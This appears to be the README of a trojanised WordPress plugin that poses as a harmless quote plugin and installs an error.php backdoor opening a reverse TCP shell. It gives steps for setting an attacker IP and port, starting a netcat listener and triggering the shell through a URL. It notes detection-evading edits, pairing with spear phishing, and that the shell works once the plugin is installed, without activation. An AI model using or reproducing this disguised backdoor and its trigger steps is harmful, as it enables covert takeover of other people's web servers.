# Conwell-Quotes
A malicious WordPress plugin that hides a reverse shell in a backdoor behind legitimate plugin functionality - used for offensive security purposes

# Purpose
Modeled after the Hello Dolly plugin, Conwell Quotes displays a random quote on each page of the WordPress admin portal based on Conwell's Acres of Diamonds (a great read BTW).  It also uploads an error.php backdoor that can be used to open a reverse TCP shell.  The reverse shell code was mostly written by Pen Test Monkey.  The print lines have been either commented out, suppressed, or slightly modified to avoid detection.

# Offensive Security Use
You'll want to pass the IP and port to the error.php to match your attack system and then upload the plugin or use in combination with the spear phishing sample below. 

Upload the plugin to Wordpress, use netcat to open a listener on your attack machine, and then open ttp://example.com/wp-content/plugins/conwell/error.php?ip=XX.XXX.XXX.X&port=12345 in a browser.  The sceen will most likely clock, but will not display any notable error messages.

# Note
Some hosts, like Bluehost, have their WordPress accounts on non-dedicated IPs which means they have nearly all ports blocked.  You may not be able to use the malicious shell in error.php.  However, the legitimate functionality in Conwell Quotes will still work and the user will not receive any error message.

When uploading the plugin, WordPress does not have any malware detection and so the plugin will install and activate as usual.  To get access to the reverse shell, the plugin does not need to be activated, it simply needs to be installed.  Yet another good reason to delete out any unused WordPress plugins.
